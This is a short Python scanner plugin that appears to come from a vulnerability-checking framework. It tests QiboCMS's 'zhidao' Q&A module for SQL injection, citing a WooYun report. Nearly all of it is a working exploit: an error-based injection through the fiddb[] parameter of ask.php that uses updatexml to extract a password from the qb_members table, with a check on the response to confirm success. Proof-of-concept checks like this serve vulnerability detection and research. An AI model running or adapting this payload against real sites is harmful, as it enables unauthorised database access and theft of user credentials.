#!/usr/bin/env python
# -*- coding: utf-8 -*-
#qibocms 知道系统 前台4处注入
#refer:http://www.wooyun.org/bugs/wooyun-2015-0122606
import re
def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    payload="zhidao/ask.php?step=4&fiddb[]=1)%20and%20updatexml(1,concat(0x5e24,(select%20concat(md5(1234),password)%20from%20qb_members%20limit%201),0x5e24),1)%23&title=wwwwwwww"
    url=arg+payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and "81dc9bdb52d04dc20036dbd8313ed0" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms','http://127.0.0.1:8080/qibocms_zhidao/')[1])